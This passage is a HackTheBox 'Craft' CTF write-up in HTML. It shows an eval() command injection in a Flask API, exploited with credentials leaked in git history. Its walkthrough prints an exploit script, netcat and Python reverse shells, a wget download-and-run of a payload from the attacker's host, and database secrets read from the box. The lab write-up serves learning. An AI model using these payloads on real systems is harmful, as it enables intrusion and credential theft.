@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Craft - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Craft was a not so straight forward box, mainly based on little configuration mistakes rather than exploits. Which makes it more interesting in my opinion. I learned a few tricks on this one.
+First thing first, let&#39;s add the box IP to the hosts file:
+$ echo &amp;#34;10.10.10.110 craft.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&#39;s start!
+User Flag Recon Let&#39;s start with the classic nmap scan:
+$ nmap -sV -sT -sC craft.htb Starting Nmap 7."/>
+<meta name="keywords" content="hackthebox, ctf, craft"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/craft/" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Craft - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." />
+<meta name="twitter:description" content="Craft was a not so straight forward box, mainly based on little configuration mistakes rather than exploits. Which makes it more interesting in my opinion. I learned a few tricks on this one.
+First thing first, let&#39;s add the box IP to the hosts file:
+$ echo &amp;#34;10.10.10.110 craft.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&#39;s start!
+User Flag Recon Let&#39;s start with the classic nmap scan:
+$ nmap -sV -sT -sC craft.htb Starting Nmap 7." />
+<meta name="twitter:site" content="/" />
+<meta name="twitter:creator" content="hg8" />
+<meta name="twitter:image" content="/img/craft-hackthebox.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Craft - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.">
+<meta property="og:description" content="Craft was a not so straight forward box, mainly based on little configuration mistakes rather than exploits. Which makes it more interesting in my opinion. I learned a few tricks on this one.
+First thing first, let&#39;s add the box IP to the hosts file:
+$ echo &amp;#34;10.10.10.110 craft.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&#39;s start!
+User Flag Recon Let&#39;s start with the classic nmap scan:
+$ nmap -sV -sT -sC craft.htb Starting Nmap 7." />
+<meta property="og:url" content="/posts/craft/" />
+<meta property="og:site_name" content="Craft - HackTheBox" />
+<meta property="og:image" content="/img/craft-hackthebox.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2020-01-04 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    hg8&#39;s Notes
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Posts</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Posts</a></li>
+      
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/craft/">Craft - HackTheBox</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-01-04
+    </span>
+    
+    
+    <span class="post-author">::
+      hg8
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+    
+    #<a href="/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="/tags/craft/">craft</a>&nbsp;
+    
+  </span>
+  
+
+  
+  <img src="/img/craft-hackthebox.png" class="post-cover" />
+  
+
+  <div class="post-content">
+    <p>Craft was a not so straight forward box, mainly based on little configuration mistakes rather than exploits. Which makes it more interesting in my opinion. I learned a few tricks on this one.</p>
+<p>First thing first, let's add the box IP to the hosts file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.110 craft.htb&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>and let's start!</p>
+<h1 id="user-flag">User Flag</h1>
+<h2 id="recon">Recon</h2>
+<p>Let's start with the classic nmap scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC craft.htb
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-20 01:26 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> craft.htb <span style="color:#f92672">(</span>10.10.10.110<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+443/tcp open  ssl/http nginx 1.15.8
+|_http-server-header: nginx/1.15.8
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.15 seconds
+</code></pre></div><p>We have a classical web app running on port 443 and the ssh port 22 open.</p>
+<p>Opening <a href="http://craft.htb">http://craft.htb</a> display the following website :</p>
+<!-- raw HTML omitted -->
+<p>This website is super simple but give us two valuable information:</p>
+<ul>
+<li>A <code>gogs</code> instance running (<code>gogs</code> is a self-hosted Git service written in Go) at <a href="https://gogs.craft.htb/">https://gogs.craft.htb/</a></li>
+<li>An api is running and it's documentation available at <a href="https://api.craft.htb/api/">https://api.craft.htb/api/</a></li>
+</ul>
+<p>We need to add those two in our <code>/etc/hosts/</code> file to be able to access it :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.110 gogs.craft.htb&#34;</span> &gt;&gt; /etc/hosts
+$ echo <span style="color:#e6db74">&#34;10.10.10.110 api.craft.htb&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>Following this, <code>gogs.craft.htb</code> displays:</p>
+<!-- raw HTML omitted -->
+<p>and <code>api.craft.htb</code> displays:</p>
+<!-- raw HTML omitted -->
+<p>We have the source code and the documentation of the API. That will surely be our entry point.</p>
+<p>Out of curiosity I checked for exploit on <code>Gogs</code> and found CVE-2018-18925 and CVE-2018-20303:</p>
+<blockquote>
+<p>Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a &ldquo;..&rdquo; session-file forgery in the file session provider in file.go.
+<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18925">https://nvd.nist.gov/vuln/detail/CVE-2018-18925</a></p>
+</blockquote>
+<blockquote>
+<p>In pkg/tool/path.go in Gogs before 0.11.82.1218, a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server.
+<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20303">https://nvd.nist.gov/vuln/detail/CVE-2018-20303</a></p>
+</blockquote>
+<p>An exploit is also avaible (<a href="https://github.com/TheZ3ro/gogsownz">GogsOwnz</a>) and allows to gain administrator rights and RCE on a Gogs/Gitea server.</p>
+<p>Unfortunately the footer of <code>gogs.craft.htb</code> shows that the version used is not a vulnerable one :</p>
+<blockquote>
+<p>© 2018 Gogs Version: 0.11.86.0130</p>
+</blockquote>
+<p>This confirms that our entry point will probably be the api. Let's investigate.</p>
+<p>Since we have the code source it will greatly help our investigation. The API is in Python with the Flask framework.</p>
+<p>Let's clone it to check the code more easily :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gogs.craft.htb/Craft/craft-api.git
+</code></pre></div><h2 id="remote-code-execution-on-api">Remote code execution on API</h2>
+<p>The first thing I do when doing static code analysis is checking if dangerous functions are used and can be used for command injection. It's the easiest way to land a shell on a box.
+If this search don't give any results I will move on to SQL injection and so on.</p>
+<p>The most common way command injection vulnerability get introduced in Python is by the <code>eval()</code> function which is used to run the python code (which is passed as an argument) within the program.</p>
+<p>A quick <code>grep</code> will tell us if such function is used within the API:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ grep -ri <span style="color:#e6db74">&#34;eval&#34;</span> craft-api
+craft-api/craft_api/api/brew/endpoints/brew.py:        <span style="color:#66d9ef">if</span> eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;%s &gt; 1&#39;</span> % request.json<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;abv&#39;</span><span style="color:#f92672">]</span><span style="color:#f92672">)</span>:
+</code></pre></div><p>We are lucky, and just by the look of the line it seems like no sanitization is done and the <code>abv</code> request parameter is directly run through <code>eval()</code>.</p>
+<p>Reading through the code of <code>brew.py</code> confirm the suspicion:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@auth.auth_required</span>
+<span style="color:#a6e22e">@api.expect</span>(beer_entry)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">Creates a new brew entry.</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+<span style="color:#75715e"># make sure the ABV value is sane.</span>
+<span style="color:#66d9ef">if</span> eval(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &gt; 1</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>]):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ABV must be a decimal value less than 1.0</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">400</span>
+<span style="color:#66d9ef">else</span>:
+    create_brew(request<span style="color:#f92672">.</span>json)
+    <span style="color:#66d9ef">return</span> None, <span style="color:#ae81ff">201</span>
+</code></pre></div><p>Any Python code send in the request <code>abv</code> parameter will get interpreted. Unfortunately <code>@auth.auth_required</code> inform us that we will first need a way to authenticate ourselves before being able to use this vulnerable endpoint.</p>
+<p>Reading the documentation and the code source it doesn't seem there is any way to create a new account or use an already made token to authenticate to the API. We need to find another way to authenticate.</p>
+<p>Since we have access to the git repository, we can try to exploit common flaw found in git/svn repositories. The most common issue is developers accidentally push API keys, token or password to the repository.</p>
+<p>There is a few good tools like <a href="https://github.com/dxa4481/truffleHog">truffleHog</a> or <a href="https://github.com/awslabs/git-secrets">git-secrets</a> allows to automatically retrieve secrets and credentials accidentally committed.</p>
+<p>Since there is only 6 commits in history we can manually review them to make sure we don't forget anything. At commit <code>a2d28ed155</code> we find an interesting cleanup:</p>
+<!-- raw HTML omitted -->
+<p>Let's try to use those credentials to authenticate to the API:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/login&#34;</span> -k --user dinesh:4aUh0A8PbVJxgd
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&#34;</span><span style="color:#f92672">}</span>
+$ curl -H <span style="color:#e6db74">&#34;X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&#34;</span>  <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/check&#34;</span> -k
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
+</code></pre></div><p>We are authenticated! Note here that this API doesn't use the usual <code>Authorization: Bearer &lt;token&gt;</code> header but a custom header in the format <code>X-Craft-Api-Token: &lt;token&gt;</code>. It can be easy to overlook this one, that's why taking time to read the code and understanding the inner workings of the app is important.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># craft_api/api/auth/endpoints/auth.py</span>
+token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">X-Craft-Api-Token</span><span style="color:#e6db74">&#39;</span>]
+</code></pre></div><p>We have now all the needed information to perform our command injection.</p>
+<p>Since we need to authenticate and perform multiple queries on the <code>brew</code> endpoint I decided to write a script to avoid writing a thousand curl request.</p>
+<p>No need to start from scratch since <code>craft-api/tests/test.py</code> already provide a solid base. I tweaked it a little to end up with this script :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> json
+<span style="color:#f92672">import</span> urllib3
+urllib3<span style="color:#f92672">.</span>disable_warnings(urllib3<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InsecureRequestWarning)
+
+response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/auth/login</span><span style="color:#e6db74">&#39;</span>,  auth<span style="color:#f92672">=</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">dinesh</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4aUh0A8PbVJxgd</span><span style="color:#e6db74">&#39;</span>), verify<span style="color:#f92672">=</span>False)
+json_response <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>text)
+token <span style="color:#f92672">=</span> json_response[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">token</span><span style="color:#e6db74">&#39;</span>]
+
+headers <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">X-Craft-API-Token</span><span style="color:#e6db74">&#39;</span>: token, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Content-Type</span><span style="color:#e6db74">&#39;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">application/json</span><span style="color:#e6db74">&#39;</span>}
+
+response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/auth/check</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span>False)
+<span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)  <span style="color:#75715e"># make sure token is valid</span>
+
+<span style="color:#66d9ef">while</span> True:
+    cmd <span style="color:#f92672">=</span> input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>)
+
+    brew_dict <span style="color:#f92672">=</span> {}
+    brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__import__(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">os</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">).popen(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">).read()</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(cmd)
+    brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bullshit</span><span style="color:#e6db74">&#39;</span>
+    brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">brewer</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bullshit</span><span style="color:#e6db74">&#39;</span>
+    brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">style</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bullshit</span><span style="color:#e6db74">&#39;</span>
+
+    json_data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(brew_dict)
+    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/brew/</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span>False)
+</code></pre></div><p>Since <code>eval()</code> will run any python code we will use this lambda function <code>__import__(&quot;os&quot;).popen(&quot;CMD&quot;).read()</code> to run an os command from the python code.</p>
+<p>I added a <code>input('&gt; ')</code> so we simply have to type our command to run it on the API. Shell style.</p>
+<p>Unfortunately we don't have any output available, so how are we going to know that our command executed successfully ?</p>
+<p>With time-based injection ;)</p>
+<p>We are going to inject a <code>sleep 5</code> command:</p>
+<ul>
+<li>If the API hang for 5 seconds, it means our command got executed successfully</li>
+<li>If the API respond immediately, the injection failed.</li>
+</ul>
+<p>Using the <code>requests</code> library <code>elapsed.total_seconds()</code> function, we can display the time elapsed for the request to success.</p>
+<p>I add it to the script so we can easily see if the <code>sleep 5</code> injection worked fine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>]
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Execution time: {}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(response<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()))
+</code></pre></div><p>Let's it give a try:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
+
+&gt; test
+Execution time: 0.147798
+&gt; sleep <span style="color:#ae81ff">5</span>
+Execution time: 5.158874
+&gt;
+</code></pre></div><p>Looks like it worked fine ! Let's tweak our script a bit to be more confortable to use:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#f92672">- brew_dict[&#39;abv&#39;] = &#39;__import__(&#34;os&#34;).popen(&#34;{}&#34;).read()&#39;.format(cmd)
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+ brew_dict[&#39;abv&#39;] = &#39;__import__(&#34;os&#34;).popen(&#34;{} &amp;&amp; sleep 3&#34;).read()&#39;.format(cmd)
+</span></code></pre></div><p>The usage of <code>&amp;&amp; sleep 3</code> means that the sleep command will only get executed if the first command succeeded. This technique will allow us to blindly learn about the box environment.</p>
+<p>Here is an example to illustrate:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
+
+&gt; curl --help
+Execution time: 0.162407
+&gt; wget --help
+Execution time: 3.160078
+</code></pre></div><p>Since <code>wget --help</code> command took 3 seconds to execute this means that the command run fine. While <code>curl --help</code> failed, the <code>sleep 3</code> didn't start meaning <code>curl</code> is not probably not installed.</p>
+<p>This little trick will allow us to have a valuable feedback to know if our command succeed or fail.</p>
+<p>Let's try to open our classic reverse shell. Start with our listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+Listening on any address <span style="color:#ae81ff">8585</span>
+</code></pre></div><p>And launch our test script on the API:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
+
+&gt; nc -e /bin/sh 10.10.10.85 <span style="color:#ae81ff">8585</span>
+Execution time: 0.218422
+&gt; nc --help
+Execution time: 4.412322
+&gt;
+</code></pre></div><p>Oddly enough this is not working, whereas <code>nc</code> seems to be installed. That's strange but let's move on to a different type of reverse shell. Since we know for sure that python is installed let's use a python reverse shell.</p>
+<p>To make things easier let's launch a small http server to host our python reverse shell file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat hg8.py
+import socket,subprocess,os;
+s<span style="color:#f92672">=</span>socket.socket<span style="color:#f92672">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#f92672">)</span>;
+s.connect<span style="color:#f92672">(</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;10.10.10.85&#34;</span>,8585<span style="color:#f92672">)</span><span style="color:#f92672">)</span>;
+os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">(</span><span style="color:#f92672">)</span>,0<span style="color:#f92672">)</span>;
+os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">(</span><span style="color:#f92672">)</span>,1<span style="color:#f92672">)</span>;
+os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">(</span><span style="color:#f92672">)</span>,2<span style="color:#f92672">)</span>;
+p<span style="color:#f92672">=</span>subprocess.call<span style="color:#f92672">(</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span><span style="color:#f92672">]</span><span style="color:#f92672">)</span>;
+$ python -m http.server
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</code></pre></div><p>And back to our original terminal let's launch our injection:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
+
+wget 10.10.10.85:8000/hg8.py -O /tmp/hg8.py
+Execution time: 1.15602
+&gt; python /tmp/hg8.py
+</code></pre></div><p>And surely enough a connection open on our netcat listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+Listening on any address <span style="color:#ae81ff">8585</span>
+Connection from 10.10.10.110:57154
+/opt/app <span style="color:#75715e"># id</span>
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>bin<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,6<span style="color:#f92672">(</span>disk<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,11<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,20<span style="color:#f92672">(</span>dialout<span style="color:#f92672">)</span>,26<span style="color:#f92672">(</span>tape<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>
+</code></pre></div><p><em>Note: Now that we are on the box we can investigate on why our original netcat command wasn't working. The <code>netcat</code> version shipped in this box in a Busybox version. The manual state:</em></p>
+<pre><code>/opt/app # nc
+BusyBox v1.29.3 (2019-01-24 07:45:07 UTC) multi-call binary.
+
+Usage: nc [OPTIONS] HOST PORT  - connect
+nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen
+
+	-e PROG	Run PROG after connect (must be last)
+   [...]
+</code></pre><p><em>In this version <code>-e</code> option <strong>must be last</strong>. So if we ran <code>nc 10.10.10.85 8585 -e /bin/sh</code> instead of <code>nc -e /bin/sh 10.10.10.85 8585</code> the command would have succeeded perfectly. I tried and it worked. Odd but good to keep in mind for the future.</em></p>
+<h2 id="pivot-from-docker-container-to-user">Pivot from docker container to user</h2>
+<p>Now back to our topic. We got our shell on the API. Unfortunately as you noticed with the <code>id</code> command, it seems like we are in a docker container. From here we won't go far from here.</p>
+<p>Our best bet might be to retrieve the API secrets to see if we can progress from here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/app/craft_api <span style="color:#75715e"># cat settings.py</span>
+<span style="color:#75715e"># Flask settings</span>
+FLASK_SERVER_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;api.craft.htb&#39;</span>
+FLASK_DEBUG <span style="color:#f92672">=</span> False  <span style="color:#75715e"># Do not use debug mode in production</span>
+
+<span style="color:#75715e"># Flask-Restplus settings</span>
+RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;list&#39;</span>
+RESTPLUS_VALIDATE <span style="color:#f92672">=</span> True
+RESTPLUS_MASK_SWAGGER <span style="color:#f92672">=</span> False
+RESTPLUS_ERROR_404_HELP <span style="color:#f92672">=</span> False
+CRAFT_API_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hz66OCkDtv8G6D&#39;</span>
+
+<span style="color:#75715e"># database</span>
+MYSQL_DATABASE_USER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
+MYSQL_DATABASE_PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qLGockJ6G2J75O&#39;</span>
+MYSQL_DATABASE_DB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
+MYSQL_DATABASE_HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;db&#39;</span>
+SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> False
+</code></pre></div><p>Let's try to dump the database for juicy informations :</p>
